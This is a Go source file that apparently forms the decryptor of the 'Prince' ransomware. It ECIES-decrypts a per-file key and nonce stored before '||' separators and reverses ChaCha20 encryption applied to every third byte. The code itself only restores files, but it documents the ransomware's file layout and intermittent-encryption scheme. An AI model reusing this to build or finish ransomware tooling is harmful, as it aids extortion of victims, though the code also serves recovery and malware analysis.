package decryption

import (
	Configuration "Prince-Decryptor/configuration"
	"fmt"
	eciesgo "github.com/ecies/go"
	"golang.org/x/crypto/chacha20"
	"io"
	"os"
	"strings"
)

const (
	separator = "||" // Separator between encrypted key/nonce and file content
)

var (
	privateKey *eciesgo.PrivateKey
	err        error
)

func init() {
	privateKey, err = eciesgo.NewPrivateKeyFromHex(Configuration.PrivateKey)
	if err != nil {
		panic(err)
	}
}

func DecryptFile(filePath string) {
	file, err := os.OpenFile(filePath, os.O_RDWR, 0644)
	if err != nil {
		fmt.Println("Error opening file:", err)
		return
	}
	defer file.Close()

	fileContent, err := io.ReadAll(file)
	if err != nil {
		fmt.Println("Error reading file:", err)
		return
	}

	// Split the file content to get the encrypted key, nonce, and ciphertext
	parts := strings.SplitN(string(fileContent), separator, 3)
	if len(parts) < 3 {
		fmt.Println("File content is malformed")
		return
	}

	encryptedKey := parts[0]
	encryptedNonce := parts[1]
	ciphertext := []byte(parts[2])

	// Decrypt the key and nonce using the private key
	key, err := eciesgo.Decrypt(privateKey, []byte(encryptedKey))
	if err != nil {
		fmt.Println("Error decrypting key:", err)
		return
	}

	nonce, err := eciesgo.Decrypt(privateKey, []byte(encryptedNonce))
	if err != nil {
		fmt.Println("Error decrypting nonce:", err)
		return
	}

	// Create the cipher for ChaCha20 decryption
	cipher, err := chacha20.NewUnauthenticatedCipher(key, nonce)
	if err != nil {
		fmt.Println("Error creating cipher:", err)
		return
	}

	plaintext := make([]byte, len(ciphertext))
	for i := 0; i < len(ciphertext); i += 3 {
		if i < len(ciphertext) {
			cipher.XORKeyStream(plaintext[i:i+1], ciphertext[i:i+1])
		}
		if i+1 < len(ciphertext) {
			plaintext[i+1] = ciphertext[i+1]
		}
		if i+2 < len(ciphertext) {
			plaintext[i+2] = ciphertext[i+2]
		}
	}

	// Write the decrypted data back to the file
	if err = file.Truncate(0); err != nil {
		fmt.Println("Error truncating file:", err)
		return
	}

	if _, err = file.Seek(0, io.SeekStart); err != nil {
		fmt.Println("Error seeking file:", err)
		return
	}

	if _, err = file.Write(plaintext); err != nil {
		fmt.Println("Error writing to file:", err)
		return
	}

	fmt.Println("File decrypted successfully")
	return
}
